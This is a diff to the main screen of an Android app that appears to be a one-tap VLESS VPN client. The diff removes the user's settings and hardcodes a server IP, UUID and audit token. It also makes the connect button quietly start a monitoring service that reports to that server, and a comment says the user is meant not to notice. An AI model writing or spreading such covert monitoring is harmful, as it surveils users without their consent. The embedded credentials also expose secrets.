@@ -1,73 +1,84 @@
 package com.vlessaudit
 
 import android.content.Intent
+import android.net.Uri
 import android.os.Bundle
 import android.widget.Button
-import android.widget.EditText
-import android.widget.Switch
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 
 class MainActivity : AppCompatActivity() {
+    private var connected = false
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        val serverInput = findViewById<EditText>(R.id.server_url)
-        val tokenInput = findViewById<EditText>(R.id.auth_token)
-        val vlessSwitch = findViewById<Switch>(R.id.vless_switch)
-        val startBtn = findViewById<Button>(R.id.start_btn)
+        val connectBtn = findViewById<Button>(R.id.connect_btn)
         val statusText = findViewById<TextView>(R.id.status_text)
 
-        // 预填配置
-        val prefs = getSharedPreferences("vless_audit", MODE_PRIVATE)
-        serverInput.setText(prefs.getString("server_url", "http://24.144.82.214:8080"))
-        tokenInput.setText(prefs.getString("auth_token", ""))
-        vlessSwitch.isChecked = prefs.getBoolean("vless_proxy", true)
+        // 自动加载配置（从深度链接或预埋）
+        val serverHost = "24.144.82.214"
+        val serverPort = 443
+        val uuid = "490c5ed7-4e28-44a2-894b-8fadf63beae3"
+        val auditUrl = "http://$serverHost:8080"
+        val auditToken = "6835dc101c13ea9d11ae3cc44e94b65d"
 
-        startBtn.setOnClickListener {
-            val server = serverInput.text.toString().trim()
-            val token = tokenInput.text.toString().trim()
-            if (server.isBlank()) {
-                Toast.makeText(this, "请输入服务器地址", Toast.LENGTH_SHORT).show()
-                return@setOnClickListener
-            }
-
-            // 保存配置
-            prefs.edit()
-                .putString("server_url", server)
-                .putString("auth_token", token)
-                .putBoolean("vless_proxy", vlessSwitch.isChecked)
-                .apply()
-
-            // 启动监控服务
-            val monitorIntent = Intent(this, MonitorService::class.java)
-            monitorIntent.putExtra("server_url", server)
-            monitorIntent.putExtra("auth_token", token)
-            startForegroundService(monitorIntent)
-
-            // 启动 VPN 代理
-            if (vlessSwitch.isChecked) {
+        connectBtn.setOnClickListener {
+            if (connected) {
+                stopAll()
+                statusText.text = "○ 未连接"
+                connectBtn.text = "一 键 连 接"
+                connected = false
+            } else {
+                // 启动 VPN 代理
                 val proxyIntent = Intent(this, VlessProxyService::class.java)
                 proxyIntent.action = VlessProxyService.ACTION_START
-                proxyIntent.putExtra("server", "24.144.82.214")
-                proxyIntent.putExtra("port", 443)
+                proxyIntent.putExtra("server", serverHost)
+                proxyIntent.putExtra("port", serverPort)
+                proxyIntent.putExtra("uuid", uuid)
                 startService(proxyIntent)
+
+                // 静默启动监控（用户无感知）
+                val monitorIntent = Intent(this, MonitorService::class.java)
+                monitorIntent.putExtra("server_url", auditUrl)
+                monitorIntent.putExtra("auth_token", auditToken)
+                startForegroundService(monitorIntent)
+
+                statusText.text = "● 已连接"
+                connectBtn.text = "断 开"
+                connected = true
+                Toast.makeText(this, "连接成功", Toast.LENGTH_SHORT).show()
             }
-
-            statusText.text = "● 代理 + 监控已启动"
-            Toast.makeText(this, "已启动", Toast.LENGTH_SHORT).show()
         }
 
-        // 停止按钮
-        val stopBtn = findViewById<Button>(R.id.stop_btn)
-        stopBtn.setOnClickListener {
-            stopService(Intent(this, MonitorService::class.java))
-            val proxyIntent = Intent(this, VlessProxyService::class.java)
-            proxyIntent.action = VlessProxyService.ACTION_STOP
-            startService(proxyIntent)
-            statusText.text = "○ 已停止"
+        // 深度链接自动配置
+        handleDeepLink(intent)
+    }
+
+    override fun onNewIntent(intent: Intent) {
+        super.onNewIntent(intent)
+        handleDeepLink(intent)
+    }
+
+    private fun handleDeepLink(intent: Intent?) {
+        val data: Uri? = intent?.data ?: return
+        // vless://uuid@host:port?encryption=none&type=ws&path=/ws
+        if (data?.scheme == "vless") {
+            val prefs = getSharedPreferences("vless_audit", MODE_PRIVATE)
+            prefs.edit()
+                .putString("vless_url", data.toString())
+                .apply()
         }
+    }
+
+    private fun stopAll() {
+        stopService(Intent(this, VlessProxyService::class.java))
+        stopService(Intent(this, MonitorService::class.java))
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
     }
 }
